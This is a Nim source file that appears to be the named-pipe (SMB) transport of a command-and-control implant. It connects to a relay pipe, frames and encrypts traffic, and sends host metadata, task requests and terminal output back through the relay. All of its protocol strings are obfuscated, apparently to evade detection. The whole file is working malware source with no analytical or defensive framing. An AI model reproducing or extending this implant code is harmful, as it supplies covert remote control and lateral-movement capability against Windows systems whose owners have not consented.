import ../winapi/handlers
import ../winapi/utils
import ../global
import ../general/metadata
import ../general/strings
import ../crypt/transport
import ./frame_chunk
import ./relay_packet
import std/json

proc pipeListen*(path: string): pointer =
  # Creates a named pipe server on the given path
  result = createNamedPipeA(
    cast[pointer](path.cstring),
    pipeAccessDuplex,
    pipeTypeByte or pipeReadmodeByte or pipeWait,
    pipeUnlimitedInstances,
    65536,
    65536,
    0,
    nil
  )

proc pipeAccept*(server: pointer): bool =
  # Accepts a client on the named pipe server
  connectNamedPipe(server, nil) != 0 or getLastError() == errorPipeConnected

proc pipeConnect*(path: string): pointer =
  # Connects to the named pipe, waiting if it is busy
  var h = createFileA(
    cast[pointer](path.cstring),
    genericRead or genericWrite,
    0,
    nil,
    openExisting,
    0,
    0
  )
  if h == invalidHandle:
    if getLastError() == errorPipeBusy:
      discard waitNamedPipeA(cast[pointer](path.cstring), 5000)
      h = createFileA(
        cast[pointer](path.cstring),
        genericRead or genericWrite,
        0,
        nil,
        openExisting,
        0,
        0
      )
      if h == invalidHandle:
        return invalidHandle
      return h
    return invalidHandle
  h

proc pipeClose*(h: pointer) =
  # Closes the pipe handle
  if h != invalidHandle and h != nil:
    discard closeHandle(h)

proc pipeCloseServer*(h: pointer) =
  # Disconnects the client and closes the server pipe
  if h != invalidHandle and h != nil:
    discard disconnectNamedPipe(h)
    discard closeHandle(h)

proc writeAllHandle(h: pointer; data: pointer; size: culong): bool =
  # Writes the full buffer to the handle
  var sent: culong = 0
  while sent < size:
    var n: culong = 0
    if writeFile(h, cast[pointer](cast[int](data) + sent.int), size - sent, addr n, nil) == 0 or n == 0:
      return false
    sent += n
  true

proc readFrameHandle*(h: pointer; timeoutMs: int = 0): string =
  # Reads a framed payload from the pipe handle
  let deadline = if timeoutMs > 0: getTickCount() + culong(timeoutMs) else: culong(0)
  result = ""
  while true:
    if deadline > 0:
      while getTickCount() < deadline:
        var avail: culong = 0
        if peekNamedPipe(h, nil, 0, nil, addr avail, nil) == 0:
          let werr = getLastError()
          if werr == 109'u32 or werr == 233'u32:
            return ""
          sleepMs(50)
          continue
        if avail > 0:
          break
        sleepMs(50)
      if getTickCount() >= deadline:
        return ""
    var hdr: array[4, char]
    var readBytes: culong = 0
    if readFile(h, addr hdr[0], 4, addr readBytes, nil) == 0 or readBytes != 4:
      return ""
    let hdrVal = frameHdrFromBE(hdr)
    let pieceLen = framePieceLen(hdrVal)
    let more = frameHasMore(hdrVal)
    if pieceLen <= 0:
      return ""
    var body = newString(pieceLen)
    var got = 0
    while got < pieceLen:
      if deadline > 0 and getTickCount() >= deadline:
        return ""
      var chunk: culong = 0
      if readFile(h, addr body[got], culong(pieceLen - got), addr chunk, nil) == 0:
        return ""
      got += chunk.int
    result.add body
    if not more:
      break

proc writeFrameHandle*(h: pointer, payload: string) =
  # Writes the payload to the pipe as framed chunks
  if payload.len <= 0:
    return
  var off = 0
  while off < payload.len:
    let pieceLen = min(frameChunkSize, payload.len - off)
    let more = off + pieceLen < payload.len
    let hdr = frameHdrToBE(frameHdrEncode(pieceLen, more))
    if not writeAllHandle(h, addr hdr[0], 4):
      return
    if pieceLen > 0 and not writeAllHandle(h, addr payload[off], culong(pieceLen)):
      return
    off += pieceLen
  discard flushFileBuffers(h)

proc smbExchange*(payload: var string): TransportResponse =
  # Encrypts the payload, exchanges it over the pipe, and decrypts the reply
  if payload.len == 0:
    return transportFail(obf("empty_payload"))
  let path = pipelineTarget
  var h = pipeConnect(path)
  if h == invalidHandle:
    return transportFail(obf("pipe_connect_failed path=") & path & obf(" winErr=") & $getLastError())
  try:
    let sentLen = payload.len
    var enc = cryptEncrypt(payload)
    payload.setLen(0)
    if enc.len == 0:
      return transportFail(obf("encrypt_failed path=") & path)
    writeFrameHandle(h, enc)
    enc.setLen(0)
    let wire = readFrameHandle(h, relayTimeout)
    var raw = ""
    try:
      raw = cryptDecrypt(wire)
    except CatchableError:
      discard
    if raw.len == 0:
      return transportFail(obf("pipe_read_empty path=") & path & obf(" sentLen=") & $sentLen)
    result = parseTransportResponse(raw)
  finally:
    pipeClose(h)

proc sendRequest*(tag: string): TransportResponse =
  # Builds the input request with metadata and sends it over the pipe
  var content = %*{(obf("option")): obf("input"), (obf("host")): tag}
  content[obf("metadata")] = createMetadata()
  var envelope = buildEnvelope(content)
  result = smbExchange(envelope)

proc sendOutput*(taskTag, output: string): TransportResponse =
  # Sends the terminal output for the given task tag over the pipe
  var envelope = buildEnvelope(%*{
    (obf("option")): obf("output"),
    (obf("type")): obf("terminal"),
    (obf("task_tag")): taskTag,
    (obf("output")): output,
  })
  result = smbExchange(envelope)

proc sendBatch*(payload: string): TransportResponse =
  # Attaches metadata to each batch item and sends the batch over the pipe
  if payload.len <= 2 or payload == obf("[]"):
    return transportFail(obf("empty_batch payloadLen=") & $payload.len)
  try:
    let batch = parseJson(payload)
    if batch.kind == JArray:
      let meta = createMetadata()
      for item in batch:
        if item.kind == JObject:
          item[obf("metadata")] = meta
    var envelope = buildEnvelope(batch)
    result = smbExchange(envelope)
  except JsonParsingError as e:
    result = transportFail(obf("batch_json_parse: ") & e.msg & obf(" payloadPreview=") & clipText(payload))
